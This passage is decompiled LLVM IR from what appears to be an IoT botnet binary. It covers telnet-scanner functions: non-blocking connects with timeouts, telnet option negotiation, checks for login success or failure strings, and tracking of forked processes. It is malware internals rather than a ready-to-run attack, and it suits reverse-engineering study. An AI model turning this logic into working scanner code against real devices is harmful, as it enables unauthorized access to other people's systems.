  br i1 %v7_9ca8, label %dec_label_pc_9ce4, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9c8c
  %v1_9cb4 = add i32 %stack_var_-36.059, 1
  %not.v7_9cc4 = icmp sgt i32 %v1_9cc061, 1
  %v2_9cdc = icmp eq i1 %not.v7_9cc4, false
  br i1 %v2_9cdc, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9c8c, %dec_label_pc_9cb0, %dec_label_pc_9cbc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9cbc.preheader ], [ %v1_9cb4, %dec_label_pc_9cb0 ], [ %stack_var_-36.059, %dec_label_pc_9c8c ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9cbc.preheader ], [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %v5_9ca0, %dec_label_pc_9c8c ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9c74, %dec_label_pc_9ce4
  %storemerge = phi i32 [ -1, %dec_label_pc_9c74 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9ce4 ]
  %v2_9d04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9d04, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9cc061, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.060, { 1, 2, 0 }
  uselistorder i32 %v1_9c20, { 1, 0 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %storemerge426, { 1, 0 }
  uselistorder i32 %v2_9a64, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cf8, { 1, 0 }
  uselistorder label %dec_label_pc_9ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9c48, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 1, 0 }
  uselistorder label %dec_label_pc_9b68.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9d14 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9d14, i32* @ip, align 4
  %v3_9d18 = load i32, i32* @fp, align 4
  store i32 40224, i32* %stack_var_-4, align 4
  %v2_9d1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d1c, i32* @fp, align 4
  %v1_9d2c = add i32 %arg1, 4
  %v2_9d2c = inttoptr i32 %v1_9d2c to i32*
  %v3_9d2c = load i32, i32* %v2_9d2c, align 4
  store i32 %v3_9d2c, i32* @r0, align 4
  %v1_9d38 = call i32 @__GI_inet_ntoa(i32 %v3_9d2c)
  store i32 %v3_9d18, i32* @fp, align 4
  ret i32 %v1_9d38

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9d54 = load i32, i32* @fp, align 4
  store i32 40284, i32* %stack_var_-4, align 4
  %v2_9d58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d58, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9d80 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9d94 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9da4 = load i8, i8* %arg3, align 1
  %v2_9da8 = icmp eq i8 %v2_9da4, -1
  br i1 %v2_9da8, label %dec_label_pc_9db0, label %dec_label_pc_9dc0

dec_label_pc_9db0:                                ; preds = %entry
  %v3_9da4 = zext i8 %v2_9da4 to i32
  %v6_9dbc = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9da4, i32 %v5_9d94)
  br label %dec_label_pc_9dc0

dec_label_pc_9dc0:                                ; preds = %entry, %dec_label_pc_9db0
  %v3_9dc4 = load i32, i32* %stack_var_0, align 4
  %v3_9dc8 = call i32 @contains_string(i32 %tmp, i32 %v3_9dc4)
  %v2_9dd0 = icmp ne i32 %v3_9dc8, 0
  %. = zext i1 %v2_9dd0 to i32
  store i32 %v3_9d54, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9da4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9dc0, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9e44.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e04 = load i32, i32* @fp, align 4
  store i32 %v3_9e04, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9e30 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9e44

dec_label_pc_9e44:                                ; preds = %dec_label_pc_9e44.lr.ph, %dec_label_pc_9e44
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9e44.lr.ph ], [ %v1_9e58, %dec_label_pc_9e44 ]
  %v5_9e50 = mul nuw nsw i32 %storemerge25, 4
  %v6_9e50 = add i32 %v5_9e50, %v2_9e30
  %v7_9e50 = inttoptr i32 %v6_9e50 to i32*
  store i32 0, i32* %v7_9e50, align 4
  %v1_9e58 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9e58, 32
  br i1 %tmp21, label %dec_label_pc_9e44, label %dec_label_pc_9e6c

dec_label_pc_9e6c:                                ; preds = %dec_label_pc_9e44
  %v13_9e04 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9e70 = udiv i32 %arg1, 32
  %v3_9e7c = mul nuw nsw i32 %v3_9e70, 4
  %v2_9e84 = add nsw i32 %v3_9e7c, -136
  %v2_9e88 = add i32 %v2_9e84, %v13_9e04
  %v1_9e8c = inttoptr i32 %v2_9e88 to i32*
  %v2_9e8c = load i32, i32* %v1_9e8c, align 4
  %v1_9e94 = urem i32 %arg1, 32
  %v6_9e9c = shl i32 1, %v1_9e94
  %v2_9ea0 = or i32 %v2_9e8c, %v6_9e9c
  store i32 %v2_9ea0, i32* %v1_9e8c, align 4
  %v1_9ec0 = add i32 %arg1, 1
  %v2_9ec8 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9edc = call i32 @__libc_select(i32 %v1_9ec0, i32 %v2_9e30, i32 0, i32 0, i32 %v2_9ec8)
  %v5_9ee8 = icmp sgt i32 %v5_9edc, 0
  br i1 %v5_9ee8, label %dec_label_pc_9ef8, label %dec_label_pc_9eec

dec_label_pc_9eec:                                ; preds = %dec_label_pc_9e6c
  br label %dec_label_pc_9f18

dec_label_pc_9ef8:                                ; preds = %dec_label_pc_9e6c
  %v5_9f0c = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9eec, %dec_label_pc_9ef8
  %storemerge = phi i32 [ %v5_9f0c, %dec_label_pc_9ef8 ], [ 0, %dec_label_pc_9eec ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9e30, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9f18, { 1, 0 }
  uselistorder label %dec_label_pc_9e44, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9f48 = icmp eq i32 %arg2, 0
  br i1 %v2_9f48, label %dec_label_pc_9f50, label %dec_label_pc_9f60

dec_label_pc_9f50:                                ; preds = %entry
  %v2_9f54 = load i32, i32* %arg1, align 4
  %v1_9f5c = call i32 @__GI_close(i32 %v2_9f54)
  br label %dec_label_pc_9f60

dec_label_pc_9f60:                                ; preds = %entry, %dec_label_pc_9f50
  %v2_9f68 = add i32 %tmp, 16
  %v3_9f68 = inttoptr i32 %v2_9f68 to i32*
  store i32 0, i32* %v3_9f68, align 4
  %v3_9f6c = load i32, i32* %stack_var_-24, align 4
  %v1_9f78 = trunc i32 %v3_9f6c to i8
  %v3_9f78 = add i32 %tmp, 8
  %v4_9f78 = inttoptr i32 %v3_9f78 to i8*
  store i8 %v1_9f78, i8* %v4_9f78, align 1
  %v1_9f80 = add i32 %tmp, 24
  %v2_9f80 = inttoptr i32 %v1_9f80 to i32*
  %v3_9f80 = load i32, i32* %v2_9f80, align 4
  store i32 512, i32* @r2, align 4
  %v2_9f90 = inttoptr i32 %v3_9f80 to i8*
  %v3_9f90 = call i32 @__GI_memset(i8* %v2_9f90, i32 0)
  ret i32 %v3_9f90

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9f60, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9fa4 = load i32, i32* @fp, align 4
  %v2_9fbc = inttoptr i32 %arg1 to i32*
  %v3_9fbc = call i32 @advance_state(i32* %v2_9fbc, i32 0)
  %v3_9fc8 = add i32 %arg1, 9
  %v4_9fc8 = inttoptr i32 %v3_9fc8 to i8*
  store i8 1, i8* %v4_9fc8, align 1
  store i32 %v3_9fa4, i32* @fp, align 4
  ret i32 %v3_9fbc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9fdc = load i32, i32* @fp, align 4
  %v3_9ff4 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_2a26c.57 to i32))
  store i32 %v3_9fdc, i32* @fp, align 4
  ret i32 %v3_9ff4
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_a014 = load i32, i32* @fp, align 4
  %v3_a02c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_2a24c.66 to i32))
  store i32 %v3_a014, i32* @fp, align 4
  ret i32 %v3_a02c

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 41044, i32* %stack_var_-4, align 4
  %v2_a050 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a050, i32* @fp, align 4
  %v1_a060 = call i32 @contains_success(i32 %arg1)
  %v2_a068 = icmp eq i32 %v1_a060, 0
  br i1 %v2_a068, label %dec_label_pc_a070, label %dec_label_pc_a098

dec_label_pc_a070:                                ; preds = %entry
  %v1_a074 = call i32 @contains_fail(i32 %arg1)
  %v2_a07c = icmp ne i32 %v1_a074, 0
  %. = zext i1 %v2_a07c to i32
  br label %dec_label_pc_a098

dec_label_pc_a098:                                ; preds = %dec_label_pc_a070, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_a070 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_a0dc

dec_label_pc_a0dc:                                ; preds = %dec_label_pc_a0dc, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_a0e0, %dec_label_pc_a0dc ]
  %v1_a0e0 = add i32 %stack_var_-24.0, 1
  %v3_a0ec = mul i32 %v1_a0e0, 4
  %v2_a0f8 = add i32 %v3_a0ec, %arg2
  %v1_a0fc = inttoptr i32 %v2_a0f8 to i32*
  %v2_a0fc = load i32, i32* %v1_a0fc, align 4
  %v2_a100 = icmp eq i32 %v2_a0fc, 0
  br i1 %v2_a100, label %dec_label_pc_a15c.preheader, label %dec_label_pc_a0dc

dec_label_pc_a15c.preheader:                      ; preds = %dec_label_pc_a0dc
  %v3_a134 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_a15c

dec_label_pc_a114:                                ; preds = %dec_label_pc_a15c
  %v3_a118 = mul i32 %storemerge2, 4
  %v2_a124 = add i32 %v3_a118, %arg2
  %v1_a128 = inttoptr i32 %v2_a124 to i32*
  %v2_a128 = load i32, i32* %v1_a128, align 4
  %v4_a134 = call i32 @strcasestr(i8* %v3_a134, i32 %v2_a128, i32 %v3_a118)
  %v2_a13c = icmp eq i32 %v4_a134, 0
  %v1_a154 = add nuw i32 %storemerge2, 1
  br i1 %v2_a13c, label %dec_label_pc_a15c, label %dec_label_pc_a174

dec_label_pc_a15c:                                ; preds = %dec_label_pc_a114, %dec_label_pc_a15c.preheader
  %storemerge2 = phi i32 [ %v1_a154, %dec_label_pc_a114 ], [ 0, %dec_label_pc_a15c.preheader ]
  %v5_a168 = icmp slt i32 %storemerge2, %v1_a0e0
  br i1 %v5_a168, label %dec_label_pc_a114, label %dec_label_pc_a174

dec_label_pc_a174:                                ; preds = %dec_label_pc_a15c, %dec_label_pc_a114
  %storemerge = phi i32 [ 1, %dec_label_pc_a114 ], [ 0, %dec_label_pc_a15c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_a0e0, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a18c = load i32, i32* @fp, align 4
  store i32 %v3_a18c, i32* %stack_var_-16, align 4
  %v13_a18c = ptrtoint i32* %stack_var_-16 to i32
  %v2_a1b4 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a1c4 = or i32 %v2_a1b4, 2048
  store i32 %v1_a1c4, i32* @r3, align 4
  %v2_a1d8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a1ec = urem i32 %arg3, 65536
  %v1_a1f4 = call i32 @__GI_htons(i32 %v3_a1ec)
  %v3_a214 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a21c = icmp eq i32 %v3_a214, 0
  br i1 %v2_a21c, label %dec_label_pc_a230, label %dec_label_pc_a224

dec_label_pc_a224:                                ; preds = %entry
  br label %dec_label_pc_a3e8

dec_label_pc_a230:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_a244 = bitcast i32* %stack_var_-40 to i8*
  %v3_a244 = call i32 @__GI_memset(i8* %v2_a244, i32 0)
  %v2_a248 = ptrtoint i32* %stack_var_-48 to i32
  %v3_a258 = call i32 @__libc_connect(i32 %arg1, i32 %v2_a248, i32 16)
  store i32 %v3_a258, i32* @r3, align 4
  %v1_a268 = icmp slt i32 %v3_a258, 0
  br i1 %v1_a268, label %dec_label_pc_a270, label %dec_label_pc_a3ac

dec_label_pc_a270:                                ; preds = %dec_label_pc_a230
  %v0_a270 = call i32 @__GI___errno_location()
  %v1_a278 = inttoptr i32 %v0_a270 to i32*
  %v2_a278 = load i32, i32* %v1_a278, align 4
  %v7_a27c = icmp eq i32 %v2_a278, 115
  br i1 %v7_a27c, label %dec_label_pc_a2a8.lr.ph, label %dec_label_pc_a3a0

dec_label_pc_a2a8.lr.ph:                          ; preds = %dec_label_pc_a270
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a294 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a2a8

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a2a8.lr.ph, %dec_label_pc_a2a8
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a2a8.lr.ph ], [ %v1_a2bc, %dec_label_pc_a2a8 ]
  %v5_a2b4 = mul nuw nsw i32 %storemerge14, 4
  %v6_a2b4 = add i32 %v5_a2b4, %v2_a294
  %v7_a2b4 = inttoptr i32 %v6_a2b4 to i32*
  store i32 0, i32* %v7_a2b4, align 4
  %v1_a2bc = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_a2bc, 32
  br i1 %tmp28, label %dec_label_pc_a2a8, label %dec_label_pc_a2d0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a2a8
  %v3_a2d4 = udiv i32 %arg1, 32
  %v3_a2e0 = mul nuw nsw i32 %v3_a2d4, 4
  %v2_a2e8 = add nsw i32 %v3_a2e0, -160
  %v2_a2ec = add i32 %v2_a2e8, %v13_a18c
  %v1_a2f0 = inttoptr i32 %v2_a2ec to i32*
  %v2_a2f0 = load i32, i32* %v1_a2f0, align 4
  %v1_a2f8 = urem i32 %arg1, 32
  %v6_a300 = shl i32 1, %v1_a2f8
  %v2_a304 = or i32 %v2_a2f0, %v6_a300
  store i32 %v2_a304, i32* %v1_a2f0, align 4
  %v1_a324 = add i32 %arg1, 1
  %v2_a32c = ptrtoint i32* %stack_var_-184 to i32
  %v5_a344 = call i32 @__libc_select(i32 %v1_a324, i32 0, i32 %v2_a294, i32 0, i32 %v2_a32c)
  %tmp29 = icmp slt i32 %v5_a344, 1
  br i1 %tmp29, label %dec_label_pc_a394, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a2d0
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a35c = ptrtoint i32* %stack_var_-192 to i32
  %v2_a360 = ptrtoint i32* %stack_var_-188 to i32
  %v5_a378 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_a35c, i32 %v2_a360)
  %v3_a37c = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a37c, i32* @r3, align 4
  %v2_a380 = icmp eq i32 %v3_a37c, 0
  br i1 %v2_a380, label %dec_label_pc_a3ac, label %dec_label_pc_a388

dec_label_pc_a388:                                ; preds = %dec_label_pc_a354
  br label %dec_label_pc_a3e8

dec_label_pc_a394:                                ; preds = %dec_label_pc_a2d0
  br label %dec_label_pc_a3e8

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a270
  br label %dec_label_pc_a3e8

dec_label_pc_a3ac:                                ; preds = %dec_label_pc_a230, %dec_label_pc_a354
  %v2_a3b8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a3c8 = and i32 %v2_a3b8, -2049
  store i32 %v1_a3c8, i32* @r3, align 4
  %v2_a3dc = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3a0, %dec_label_pc_a394, %dec_label_pc_a388, %dec_label_pc_a224, %dec_label_pc_a3ac
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a394 ], [ 1, %dec_label_pc_a3ac ], [ 0, %dec_label_pc_a388 ], [ 0, %dec_label_pc_a3a0 ], [ 0, %dec_label_pc_a224 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a294, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a3e8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a3ac, { 1, 0 }
  uselistorder label %dec_label_pc_a2a8, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_a3fc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a3fc, i32* @ip, align 4
  %v3_a400 = load i32, i32* @r4, align 4
  %v6_a400 = load i32, i32* @r5, align 4
  %v9_a400 = load i32, i32* @r6, align 4
  %v12_a400 = load i32, i32* @fp, align 4
  store i32 41992, i32* %stack_var_-4, align 4
  %v2_a404 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a404, i32* @fp, align 4
  %v0_a40c = call i32 @__libc_fork()
  %v2_a41c = icmp eq i32 %v0_a40c, 0
  br i1 %v2_a41c, label %dec_label_pc_a588, label %dec_label_pc_a430

dec_label_pc_a430:                                ; preds = %entry
  %v2_a434 = load i32, i32* @global_var_2a538.68, align 4
  %v5_a434 = load i32, i32* @global_var_2a53c.69, align 4
  %v2_a440 = add i32 %v2_a434, 1
  %v3_a440 = icmp eq i32 %v2_a440, 0
  %v4_a444 = zext i1 %v3_a440 to i32
  %v5_a444 = add i32 %v4_a444, %v5_a434
  store i32 %v2_a440, i32* @global_var_2a538.68, align 4
  store i32 %v5_a444, i32* @global_var_2a53c.69, align 4
  %v2_a460 = add i32 %v2_a434, 2
  %v3_a460 = icmp eq i32 %v2_a440, -1
  %v4_a464 = zext i1 %v3_a460 to i32
  %v5_a464 = add i32 %v5_a444, %v4_a464
  %v3_a468 = udiv i32 %v2_a460, 1073741824
  %v3_a46c = mul i32 %v5_a464, 4
  %v2_a470 = or i32 %v3_a46c, %v3_a468
  store i32 %v2_a470, i32* @r4, align 4
  %v3_a474 = mul i32 %v2_a460, 4
  %v1_a47c = call i32 @malloc(i32 %v3_a474)
  br label %dec_label_pc_a4d4

dec_label_pc_a494:                                ; preds = %dec_label_pc_a4d4, %dec_label_pc_a520
  %v3_a498 = mul i32 %storemerge2, 4
  %v2_a4a4 = add i32 %v3_a498, %v1_a47c
  %v2_a4b8 = load i32, i32* @global_var_30798.71, align 4
  %v2_a4bc = add i32 %v2_a4b8, %v3_a498
  %v1_a4c0 = inttoptr i32 %v2_a4bc to i32*
  %v2_a4c0 = load i32, i32* %v1_a4c0, align 4
  %v2_a4c4 = inttoptr i32 %v2_a4a4 to i32*
  store i32 %v2_a4c0, i32* %v2_a4c4, align 4
  %v1_a4cc = add i32 %storemerge2, 1
  br label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a430, %dec_label_pc_a494
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a430 ], [ %v1_a4cc, %dec_label_pc_a494 ]
  %v2_a4ec = load i32, i32* @global_var_2a538.68, align 4
  %v5_a4ec = load i32, i32* @global_var_2a53c.69, align 4
  %v2_a500 = add i32 %v2_a4ec, -1
  %v3_a500 = icmp ne i32 %v2_a4ec, 0
  %v3_a504 = add i32 %v5_a4ec, -1
  %v5_a504 = sext i1 %v3_a500 to i32
  %v9_a518 = icmp eq i32 %v3_a504, %v5_a504
  br i1 %v9_a518, label %dec_label_pc_a520, label %dec_label_pc_a494

dec_label_pc_a520:                                ; preds = %dec_label_pc_a4d4
  store i32 %v2_a500, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a500, %storemerge2
  br i1 %tmp, label %dec_label_pc_a494, label %dec_label_pc_a540

dec_label_pc_a540:                                ; preds = %dec_label_pc_a520
  store i32 %v5_a4ec, i32* @r4, align 4
  %v3_a548 = mul i32 %v2_a4ec, 4
  %v1_a54c = add i32 %v1_a47c, -4
  %v2_a558 = add i32 %v1_a54c, %v3_a548
  %v2_a560 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a40c, i32* %v2_a560, align 4
  %v2_a568 = load i32, i32* @global_var_30798.71, align 4
  store i32 %v2_a568, i32* @r0, align 4
  %v0_a570 = call i32 @free()
  store i32 %v1_a47c, i32* @global_var_30798.71, align 4
  br label %dec_label_pc_a588

dec_label_pc_a588:                                ; preds = %entry, %dec_label_pc_a540
  store i32 %v3_a400, i32* @r4, align 4
  store i32 %v6_a400, i32* @r5, align 4
  store i32 %v9_a400, i32* @r6, align 4
  store i32 %v12_a400, i32* @fp, align 4
  ret i32 %v0_a40c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a498, { 1, 0 }
  uselistorder i32 %v1_a47c, { 2, 0, 1 }
  uselistorder i32 %v2_a440, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a588, { 1, 0 }
  uselistorder label %dec_label_pc_a4d4, { 1, 0 }
  uselistorder label %dec_label_pc_a494, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a5c4 = add i32 %arg2, 1
  %v1_a5c8 = inttoptr i32 %v1_a5c4 to i8*
  %v2_a5c8 = load i8, i8* %v1_a5c8, align 1
  %v7_a5d4 = icmp ult i8 %v2_a5c8, -5
  br i1 %v7_a5d4, label %dec_label_pc_a720, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %entry
  %v7_a5e4 = icmp eq i8 %v2_a5c8, -1
  br i1 %v7_a5e4, label %dec_label_pc_a5e8, label %dec_label_pc_a604

dec_label_pc_a5e8:                                ; preds = %dec_label_pc_a5dc
  br label %dec_label_pc_a720

dec_label_pc_a604:                                ; preds = %dec_label_pc_a5dc
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a60c = ptrtoint i8* %stack_var_-17 to i32
  %v5_a620 = call i32 @__libc_send(i32 %arg1, i32 %v2_a60c, i32 1, i32 16384)
  %v2_a62c = load i8, i8* %v1_a5c8, align 1
  %v7_a630 = icmp eq i8 %v2_a62c, -4
  br i1 %v7_a630, label %dec_label_pc_a638, label %dec_label_pc_a644

dec_label_pc_a638:                                ; preds = %dec_label_pc_a604
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a644:                                ; preds = %dec_label_pc_a604
  %v2_a64c = load i8, i8* %v1_a5c8, align 1
  %v7_a650 = icmp eq i8 %v2_a64c, -2
  br i1 %v7_a650, label %dec_label_pc_a658, label %dec_label_pc_a664

dec_label_pc_a658:                                ; preds = %dec_label_pc_a644
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a664:                                ; preds = %dec_label_pc_a644
  %v2_a66c = load i8, i8* %v1_a5c8, align 1
  %v7_a670 = icmp eq i8 %v2_a66c, 3
  %v7_a684 = icmp eq i8 %v2_a66c, -3
  br i1 %v7_a670, label %dec_label_pc_a678, label %dec_label_pc_a6b0

dec_label_pc_a678:                                ; preds = %dec_label_pc_a664
  br i1 %v7_a684, label %dec_label_pc_a68c, label %dec_label_pc_a698

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a678
  br label %dec_label_pc_a6a0

dec_label_pc_a698:                                ; preds = %dec_label_pc_a678
  br label %dec_label_pc_a6a0

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a68c, %dec_label_pc_a698
  %storemerge = phi i8 [ -3, %dec_label_pc_a698 ], [ -5, %dec_label_pc_a68c ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a6b0:                                ; preds = %dec_label_pc_a664
  br i1 %v7_a684, label %dec_label_pc_a6c4, label %dec_label_pc_a6d0

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a6b0
  br label %dec_label_pc_a6d8

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6b0
  br label %dec_label_pc_a6d8

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a6c4, %dec_label_pc_a6d0
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a6d0 ], [ -4, %dec_label_pc_a6c4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a6e4:                                ; preds = %dec_label_pc_a6a0, %dec_label_pc_a658, %dec_label_pc_a638, %dec_label_pc_a6d8
  %v4_a6f8 = call i32 @__libc_send(i32 %arg1, i32 %v2_a60c, i32 1, i32 16384)
  %v1_a700 = add i32 %arg2, 2
  %v4_a714 = call i32 @__libc_send(i32 %arg1, i32 %v1_a700, i32 1, i32 16384)
  br label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a5e8, %dec_label_pc_a6e4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a6e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a6d8, { 1, 0 }
  uselistorder label %dec_label_pc_a6a0, { 1, 0 }
}

